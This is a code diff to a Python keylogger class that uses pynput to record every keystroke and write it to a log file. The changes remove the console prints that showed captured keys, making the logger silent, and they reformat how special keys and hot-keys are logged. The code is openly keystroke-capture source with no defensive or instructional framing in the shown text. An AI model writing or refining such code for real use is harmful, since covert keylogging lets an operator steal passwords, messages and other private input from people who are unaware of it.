@@ -1,6 +1,7 @@
 # Importing Libraries and Utilities
 from pynput.keyboard import Key, Listener
 from Utility import checkLogDir, checkFileSize, logFormatterString, currentLocalTime
+import re
 
 
 # Class for Keyboard Logger
@@ -23,7 +24,6 @@ class keyBoardLogger:
         # Appending Keys and Changing the Count
         cls.__keys.append(key)
         cls.__count += 1
-        print(f"{key} Pressed!")
 
     # Method `onRelease`
     """
@@ -57,14 +57,9 @@ class keyBoardLogger:
                 f.write("\n\t")
                 for key in cls.__keys:
                     k = str(key).replace("'", "")
-                    print(k)
-                    if k.find("space") > 0:
-                        f.write("[SPACE]")
-                    elif k.find("shift") > 0:
-                        f.write("[SHIFT]")
-                    elif k.find("enter") > 0:
-                        f.write("[ENTER]")
-                    elif k.find('\\x'):
+                    if k.find("Key") == 0:
+                        f.write(f"[{k.split('Key.')[-1].upper()}]")
+                    elif len(re.findall("\\d{2}", k)) > 0:
                         f.write("[HOT-KEY]")
                     else:
                         f.write(k)
@@ -79,3 +74,6 @@ class keyBoardLogger:
     def runKeyBoardLogger(cls):
         with Listener(on_press = cls.__onPress, on_release = cls.__onRelease) as listener:
             listener.join()
+
+
+
